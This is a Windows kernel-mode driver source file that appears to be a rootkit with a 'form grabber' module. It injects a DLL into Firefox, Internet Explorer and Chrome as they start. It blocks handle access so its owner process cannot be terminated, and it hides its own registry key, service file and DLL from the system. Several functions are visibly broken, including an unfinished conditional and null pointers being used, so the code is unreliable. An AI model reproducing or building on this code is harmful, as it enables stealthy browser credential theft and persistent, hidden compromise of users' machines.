#pragma comment(lib, "fltmgr.lib")
#include <fltKernel.h>
#include <ntifs.h>
#include <ntdef.h>

#include <ntstrsafe.h>
#include <wdmsec.h>
#include "Header.h"
extern BOOLEAN Configured;
extern PUNICODE_STRING DllPath;
extern PUNICODE_STRING RegistryPath;
extern PUNICODE_STRING ServicePath;
extern LARGE_INTEGER liRegistry;
extern PDEVICE_OBJECT g_DeviceObject;
#ifdef FORMGRABBER
VOID InjectIntoProcess(HANDLE hPID) {
	NTSTATUS rv = STATUS_UNSUCCESSFUL;
	HANDLE hProcess = NULL;
	CLIENT_ID ClientId = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	OBJECT_ATTRIBUTES oaf = { 0 };
	HANDLE hFile = NULL; 
	PFILE_STANDARD_INFORMATION FileInfo = NULL;
//	HANDLE hSection = NULL;
	IO_STATUS_BLOCK isb;
	LARGE_INTEGER liallocation;
	
	InitializeObjectAttributes(&oaf, DllPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);

	ClientId.UniqueProcess = hPID;
	InitializeObjectAttributes(&oa, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);
	
	rv = _ZwOpenProcess(&hProcess, GENERIC_ALL, &oa, &ClientId);
	//PEPROCESS CurrentProcess = PsGetCurrentProcess();
	PEPROCESS RemoteProcess;
	if (NT_SUCCESS(_PsLookupProcessByProcessId(hProcess, &RemoteProcess))) {
		rv = _ZwCreateFile(hFile, GENERIC_READ, &oaf, &isb, &liallocation, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SEQUENTIAL_ONLY, NULL, 0);

		rv = _ZwQueryInformationFile(hFile, &isb, FileInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		ULONG llSize = FileInfo->AllocationSize.LowPart;
		PVOID DLL = _ExAllocatePoolWithTag(NonPagedPool, llSize + 1, 'AdEf');
		SIZE_T BytesWritten = llSize;
		rv = _ZwReadFile(hFile, NULL, NULL, NULL, &isb, DLL, llSize, NULL, NULL);
		SIZE_T sRegionSize = 0;
		rv = _ZwAllocateVirtualMemory(hProcess, 0x00, 0, &sRegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		rv = ZwWriteVirtualMemory(hProcess, 0x00, g_Config.ProgramPath, llSize, &BytesWritten);
		_ZwFreeVirtualMemory(hProcess, 0x00, &sRegionSize, MEM_DECOMMIT);
		
		_ExFreePoolWithTag(DLL, 'AdEf');
	}
	
	_ZwClose(hProcess);

}
VOID PcreateProcessNotifyRoutineEx(_Inout_ PEPROCESS Process, _In_ HANDLE ProcessId, _In_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo) {
	UNREFERENCED_PARAMETER(Process);
	if (CreateInfo != NULL) {

		PUNICODE_STRING Firefox = NULL;
		PUNICODE_STRING IE = NULL;
		PUNICODE_STRING Chrome = NULL;
		RtlInitUnicodeString(Firefox, L"firefox.exe");
		RtlInitUnicodeString(IE, L"iexplore.exe");
		RtlInitUnicodeString(Chrome, L"chrome.exe");

		if (_RtlEqualUnicodeString(CreateInfo->ImageFileName, Firefox, TRUE) || _RtlEqualUnicodeString(CreateInfo->ImageFileName, IE, TRUE) || _RtlEqualUnicodeString(CreateInfo->ImageFileName, Chrome, TRUE)) {
			InjectIntoProcess(ProcessId); // INVALID_HANDLE_VALUE

		}
	}
	else {
		DeviceConfig *Config = GetConfig(Device);
		RtlSecureZeroMemory(Config, sizeof(DeviceConfig));
		if(ProcessId == )
	}

}
#endif


extern PDeviceConfig GetConfig(PDEVICE_OBJECT DeviceObject);

OB_PREOP_CALLBACK_STATUS  PreOperationCallback(
	PVOID RegistrationContext,
	POB_PRE_OPERATION_INFORMATION OperationInformation
) {
	OB_PREOP_CALLBACK_STATUS rv = OB_PREOP_SUCCESS;
	if (Configured) {
		UNREFERENCED_PARAMETER(RegistrationContext);
		UNREFERENCED_PARAMETER(OperationInformation);



		ACCESS_MASK AccessBitsToClear = 0;
		ACCESS_MASK AccessBitsToSet = 0;
		ACCESS_MASK InitialDesiredAccess = 0;
		ACCESS_MASK OriginalDesiredAccess = 0;


		PACCESS_MASK DesiredAccess = NULL;


		DeviceConfig *Config = GetConfig(g_DeviceObject);
		PEPROCESS ProtectedProcess;
		PsLookupProcessByProcessId((HANDLE)Config->OwnerProcessID, &ProtectedProcess);
		if (OperationInformation->ObjectType == *PsProcessType) {
			
			if (ProtectedProcess != OperationInformation->Object)
			{
				return rv;
			}


			if (OperationInformation->Object == PsGetCurrentProcess()) {
				return rv;
			}

			AccessBitsToClear = 0x0001;
			AccessBitsToSet = 0;
		}
		else if (OperationInformation->ObjectType == *PsThreadType) {
			HANDLE ProcessIdOfTargetThread = PsGetThreadProcessId((PETHREAD)OperationInformation->Object);


			if ((HANDLE)Config->OwnerProcessID != ProcessIdOfTargetThread) {
				return rv;
			}

			if (ProcessIdOfTargetThread == PsGetCurrentProcessId()) {

				return rv;
			}

			AccessBitsToClear = 0x0001;
			AccessBitsToSet = 0;
		}
		else {
			return rv;
		}

		switch (OperationInformation->Operation) {
		case OB_OPERATION_HANDLE_CREATE:
			DesiredAccess = &OperationInformation->Parameters->CreateHandleInformation.DesiredAccess;
			OriginalDesiredAccess = OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess;

			break;

		case OB_OPERATION_HANDLE_DUPLICATE:
			DesiredAccess = &OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess;
			OriginalDesiredAccess = OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess;

			break;

		default:
			break;
		}

		InitialDesiredAccess = *DesiredAccess;
		if (OperationInformation->KernelHandle != 1) {
			*DesiredAccess &= ~AccessBitsToClear;
			*DesiredAccess |= AccessBitsToSet;
		}


	}
	return rv;
}




NTSTATUS PreOpenKey(PVOID context, PREG_OPEN_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	if (_RtlEqualUnicodeString(RegistryPath, info->CompleteName, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}


NTSTATUS PreDeleteValue(PVOID context, PREG_DELETE_VALUE_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	PUNICODE_STRING pus;
	NTSTATUS st = _CmCallbackGetKeyObjectID(&liRegistry, info->Object, NULL, &pus);
	if (!NT_SUCCESS(st)) {
		return STATUS_SUCCESS;
	}

	if (_RtlEqualUnicodeString(RegistryPath, pus, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}
NTSTATUS PreSetValue(PVOID context, PREG_SET_VALUE_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	PUNICODE_STRING pus;
	NTSTATUS st = _CmCallbackGetKeyObjectID(&liRegistry, info->Object, NULL, &pus);
	if (!NT_SUCCESS(st)) {
		return STATUS_SUCCESS;
	}

	if (_RtlEqualUnicodeString(RegistryPath, pus, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}

NTSTATUS PreQueryMultipleValue(PVOID context, PREG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION info)
{

	UNREFERENCED_PARAMETER(context);
	PUNICODE_STRING pus;
	NTSTATUS st = _CmCallbackGetKeyObjectID(&liRegistry, info->Object, NULL, &pus);
	if (!NT_SUCCESS(st)) {
		return STATUS_SUCCESS;
	}

	if (_RtlEqualUnicodeString(RegistryPath, pus, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}
NTSTATUS PreQueryValue(PVOID context, PREG_QUERY_VALUE_KEY_INFORMATION  info)
{
	UNREFERENCED_PARAMETER(context);
	PUNICODE_STRING pus;
	NTSTATUS st = _CmCallbackGetKeyObjectID(&liRegistry, info->Object, NULL, &pus);
	if (!NT_SUCCESS(st)) {
		return STATUS_SUCCESS;
	}

	if (_RtlEqualUnicodeString(RegistryPath, pus, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}
NTSTATUS PreCreateKey(PVOID context, PREG_PRE_CREATE_KEY_INFORMATION info)
{

	UNREFERENCED_PARAMETER(context);
	if (_RtlEqualUnicodeString(RegistryPath, info->CompleteName, TRUE)) {
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;
}

NTSTATUS RegistryCallBack( PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {
	if (Configured) {
		REG_NOTIFY_CLASS Value = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;
		NTSTATUS rv = STATUS_UNSUCCESSFUL;
		switch (Value) {
		case RegNtPreCreateKey:
		case RegNtPreCreateKeyEx:
		case RegNtPreOpenKey:
			rv = PreCreateKey(CallbackContext, (PREG_PRE_CREATE_KEY_INFORMATION)Argument2);
			break;

		case RegNtPreOpenKeyEx:
			rv = PreOpenKey(CallbackContext, (PREG_OPEN_KEY_INFORMATION)Argument2);
			break;
		case RegNtSetValueKey:
			rv = PreSetValue(CallbackContext, (PREG_SET_VALUE_KEY_INFORMATION)Argument2);
			break;
		case RegNtPreDeleteValueKey:
			rv = PreDeleteValue(CallbackContext, (PREG_DELETE_VALUE_KEY_INFORMATION)Argument2);
			break;
		case RegNtPreQueryValueKey:
			rv = PreQueryValue(CallbackContext, (PREG_QUERY_VALUE_KEY_INFORMATION)Argument2);
			break;
		case RegNtPreQueryMultipleValueKey:
			rv = PreQueryMultipleValue(CallbackContext, (PREG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION)Argument2);
			break;
			



		default: {
			rv = STATUS_SUCCESS;
			break;
		}
		}
		return rv;
	}
	return STATUS_SUCCESS;
}



NTSTATUS FilterSetup(PCFLT_RELATED_OBJECTS FltObjects, FLT_INSTANCE_SETUP_FLAGS Flags, DEVICE_TYPE VolumeDeviceType, FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(VolumeDeviceType);
	UNREFERENCED_PARAMETER(VolumeFilesystemType);

	
	return STATUS_SUCCESS;
}


FLT_PREOP_CALLBACK_STATUS FltCreateFilePre(_Inout_ PFLT_CALLBACK_DATA Data, _In_ PCFLT_RELATED_OBJECTS FltObjects, _Flt_CompletionContext_Outptr_ PVOID *CompletionContext)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);

	FLT_PREOP_CALLBACK_STATUS st = FLT_PREOP_SUCCESS_NO_CALLBACK;
	if (Configured) {
		PFLT_FILE_NAME_INFORMATION FFNI = NULL;
		RtlZeroMemory(FFNI, sizeof(FLT_FILE_NAME_INFORMATION));
		BOOLEAN PreventOpen = FALSE;




		UINT32 CreateOptions = Data->Iopb->Parameters.Create.Options & 0x00FFFFFF;

		NTSTATUS rv = _FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &FFNI);
		if (!NT_SUCCESS(rv))
		{
			st = FLT_PREOP_SUCCESS_NO_CALLBACK;
			return st;
		}

		if (!(CreateOptions & FILE_DIRECTORY_FILE))
		{

			RtlCompareUnicodeString(ServicePath, &FFNI->Name, TRUE);
#ifdef FORMGRABBER
			RtlCompareUnicodeString(DllPath, &FFNI->Name, TRUE);
#endif
			PreventOpen = TRUE;
		}

		if (!PreventOpen) {
			RtlCompareUnicodeString(ServicePath, &FFNI->Name, TRUE);
#ifdef FORMGRABBER
			RtlCompareUnicodeString(DllPath, &FFNI->Name, TRUE);
#endif
			PreventOpen = TRUE;
		}
		_FltReleaseFileNameInformation(FFNI);

		if (PreventOpen)
		{
			Data->IoStatus.Status = STATUS_NO_SUCH_FILE;
			st = FLT_PREOP_COMPLETE;
			return st;
		}

		st = FLT_PREOP_SUCCESS_NO_CALLBACK;
		return st;
	}
	return st;

}

